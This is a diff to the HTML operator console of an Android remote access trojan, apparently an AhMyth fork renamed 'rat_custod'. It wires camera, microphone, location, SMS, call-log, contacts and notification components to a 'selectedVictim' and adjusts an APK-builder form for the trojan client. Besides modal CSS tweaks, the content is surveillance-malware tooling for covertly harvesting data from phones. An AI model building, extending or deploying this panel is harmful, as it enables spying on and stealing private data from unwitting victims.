@@ -31,19 +31,31 @@
   <script src="assets/js/controllers/LabCtrl.js"></script>
   <!-- Componentes LAB -->
   <script src="assets/js/components/labCalls.js"></script>
-  <!-- <script src="assets/js/components/labCamera.js"></script> --> 
+  <script src="assets/js/components/labCamera.js"></script>
   <script src="assets/js/components/labContacts.js"></script>
   <script src="assets/js/components/labMic.js"></script>
   <script src="assets/js/components/labLocation.js"></script>
   <script src="assets/js/components/labNotifi.js"></script>
   <script src="assets/js/components/labSms.js"></script>
-  <script src="assets/js/components/labScreenshot.js"></script>
 
   <style>
     #log, #apkLog { height: 180px; overflow:auto; background:#111; color:#fff; padding:8px; }
     .log .date { display:inline-block; width:25%; }
     .log .msg  { display:inline-block; width:70%; }
-    .lab-modal { position: fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,.5); z-index:1000; display:flex; align-items:center; justify-content:center; }
+    
+    .lab-modal { 
+      position: fixed; 
+      top:0; 
+      left:0; 
+      width:100vw; 
+      height:100vh; 
+      background:rgba(0,0,0,.5); 
+      z-index:1000; 
+      display:flex; 
+      align-items:center; 
+      justify-content:center; 
+    }
+    
     .lab-card {
       background:#fff;
       border-radius:8px;
@@ -51,11 +63,23 @@
       width:960px;
       max-width:97vw;
       padding:28px 0 0 0;
-      min-height:650px;
+      max-height: 90vh;
+      overflow-y: auto;
       position:relative;
-      overflow: hidden;
+      display: flex;
+      flex-direction: column;
     }
-    .lab-close { position:absolute; top:16px; right:18px; font-size: 1.5rem; cursor:pointer; color:#444; }
+    
+    .lab-close { 
+      position:absolute; 
+      top:16px; 
+      right:18px; 
+      font-size: 1.5rem; 
+      cursor:pointer; 
+      color:#444; 
+      z-index:1001;
+    }
+    
     .lab-card .ui.menu {
       flex-wrap: wrap;
       overflow-x: auto;
@@ -63,16 +87,26 @@
       border-radius: 8px 8px 0 0;
       box-sizing: border-box;
       width: 100%;
+      position: sticky;
+      top: 0;
+      background: #fff;
+      z-index: 10;
     }
+    
     .lab-card .ui.menu .item {
       min-width: 110px;
       text-align: center;
       font-size: 1rem;
       box-sizing: border-box;
     }
+    
     .lab-card .ui.attached.segment {
-      max-height: 400px;
+      max-height: 500px;
       overflow-y: auto;
+      overflow-x: auto;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
     }
   </style>
 </head>
@@ -168,15 +202,11 @@
           <a class="item" ng-class="{'active': labTab==='sms'}" ng-click="labTab='sms'"><i class="grey talk outline icon"></i> SMS</a>
           <a class="item" ng-class="{'active': labTab==='calls'}" ng-click="labTab='calls'"><i class="black call icon"></i> Calls Logs</a>
           <a class="item" ng-class="{'active': labTab==='notifications'}" ng-click="labTab='notifications'"><i class="pink bell icon"></i> Notifications</a>
-          <a class="item" ng-class="{'active': labTab==='screenshot'}" ng-click="labTab='screenshot'"><i class="orange camera icon"></i> Screenshot</a>
         </div>
         <div class="ui attached segment">
           <!-- CÁMARA -->
           <div ng-show="labTab==='camera'">
-            <div class="ui segment">
-              <h2 class="ui header">Cámara</h2>
-              <!-- ...código existente de cámara... -->
-            </div>
+            <lab-camera victim="selectedVictim"></lab-camera>
           </div>
           <!-- MIC -->
           <div ng-show="labTab==='mic'">
@@ -201,9 +231,6 @@
           <div ng-show="labTab==='notifications'">
             <lab-notifi victim="selectedVictim"></lab-notifi>
           </div>
-          <div ng-show="labTab==='screenshot'">
-            <lab-screenshot victim="selectedVictim"></lab-screenshot>
-          </div>
         </div>
         <div id="logy" class="ui bottom attached black message notDraggable">
           <div ng-repeat="log in logs" class="log">
@@ -226,8 +253,8 @@
         <!-- Directorio del proyecto -->
         <div class="field">
           <label>Directorio del proyecto</label>
-          <input type="text" ng-model="build.projectDir" placeholder="/Users/jesusverdiguel/AhMyth/Ahmyth-Client">
-          <small>Carpeta donde está tu proyecto de cliente AhMyth</small>
+          <input type="text" ng-model="build.projectDir" placeholder="/Users/jesusverdiguel/rat_custod/rat-Client">
+          <small>Carpeta donde está tu proyecto de cliente rat_custod</small>
         </div>
 
         <!-- Nombre de salida -->
@@ -263,15 +290,13 @@
           </div>
         </div>
 
-        <!-- Servidor -->
-        <div class="two fields">
-          <div class="field">
-            <label>Servidor IP</label>
-            <input type="text" ng-model="build.serverIp" placeholder="192.168.1.100">
-          </div>
-          <div class="field">
-            <label>Servidor Puerto</label>
-            <input type="text" ng-model="build.serverPort" placeholder="42474">
+        <!-- Nota sobre configuración dinámica -->
+        <div class="ui info message">
+          <i class="info circle icon"></i>
+          <div class="content">
+            <div class="header">Configuración Dinámica de Servidor</div>
+            <p>La IP y el puerto del servidor se obtendrán dinámicamente desde <code>config.json</code>.
+            No es necesario especificarlos aquí. Edita <code>rat-Server/config.json</code> para cambiar la configuración.</p>
           </div>
         </div>
 
